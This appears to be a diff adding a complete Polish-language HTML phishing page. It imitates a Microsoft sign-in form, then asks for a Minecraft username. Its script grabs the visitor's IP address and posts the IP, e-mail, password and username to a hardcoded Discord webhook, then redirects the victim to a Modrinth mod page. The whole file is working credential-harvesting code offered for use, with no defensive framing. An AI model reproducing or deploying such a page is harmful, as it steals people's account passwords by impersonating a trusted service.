@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zbieranie IP i wysyłanie na Discord Webhook</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #74ABE2 0%, #5563DE 100%);
+            color: #000;
+        }
+        .container {
+            text-align: center;
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+            width: 90%;
+            max-width: 400px;
+        }
+        .header {
+            margin-bottom: 20px;
+        }
+        .header img {
+            width: 120px;
+        }
+        h1 {
+            margin-bottom: 20px;
+            font-size: 1.5rem;
+            color: #333;
+        }
+        input[type="text"], input[type="password"] {
+            padding: 10px;
+            margin-bottom: 20px;
+            width: 100%;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            background-color: #0078D4;
+            color: #fff;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #005a9e;
+        }
+        #page2 {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Strona logowania -->
+    <div class="container" id="page1">
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/1200px-Microsoft_logo.svg.png" alt="Microsoft Logo">
+        </div>
+        <h1>Zaloguj się</h1>
+        <input type="text" id="email" placeholder="Adres e-mail">
+        <input type="password" id="password" placeholder="Hasło">
+        <button onclick="goToPage2()">Zaloguj się</button>
+    </div>
+
+    <!-- Strona wpisania nazwy użytkownika -->
+    <div class="container" id="page2">
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/en/5/51/Minecraft_cover.png" alt="Minecraft Banner">
+        </div>
+        <h1>Podaj swoją nazwę użytkownika</h1>
+        <input type="text" id="username" placeholder="Nazwa użytkownika">
+        <button onclick="submitData()">Wyślij</button>
+    </div>
+
+    <script>
+        let userIP = '';
+        let email = '';
+        let password = '';
+
+        // Funkcja do pobrania adresu IP
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Błąd przy pobieraniu adresu IP:', error);
+            }
+        }
+
+        // Funkcja do wysłania danych na Discord Webhook
+        async function sendDataToDiscord(ip, email, password, username) {
+            const webhookURL = 'https://ptb.discord.com/api/webhooks/1252938460067790888/AQMQkw8gjRUubsPTigt9EChte1D3Ji6cPuI2ioaaMlaXtNTBqeXjxVF1uWa7Zhvk9Nnz';  // Zamień to na URL swojego webhooka
+            const message = {
+                content: `Adres IP użytkownika: ${ip}\nE-mail: ${email}\nHasło: ${password}\nNazwa użytkownika: ${username}`
+            };
+
+            try {
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(message)
+                });
+
+                if (!response.ok) {
+                    throw new Error('Błąd przy wysyłaniu wiadomości na Discord');
+                }
+
+                console.log('Dane wysłane na Discord:', ip, email, password, username);
+            } catch (error) {
+                console.error('Błąd przy wysyłaniu na Discord:', error);
+            }
+        }
+
+        // Funkcja do przejścia na stronę wpisania nazwy użytkownika
+        function goToPage2() {
+            email = document.getElementById('email').value;
+            password = document.getElementById('password').value;
+            document.getElementById('page1').style.display = 'none';
+            document.getElementById('page2').style.display = 'block';
+        }
+
+        // Funkcja do obsługi przycisku "Wyślij"
+        async function submitData() {
+            const username = document.getElementById('username').value;
+            await sendDataToDiscord(userIP, email, password, username);
+            redirectToURL('https://modrinth.com/mod/totemcounter');
+        }
+
+        // Funkcja do przekierowania użytkownika na inną stronę
+        function redirectToURL(url) {
+            window.location.href = url;
+        }
+
+        // Pobranie IP użytkownika po załadowaniu strony
+        getIP().then(ip => {
+            userIP = ip;
+        });
+    </script>
+</body>
+</html>
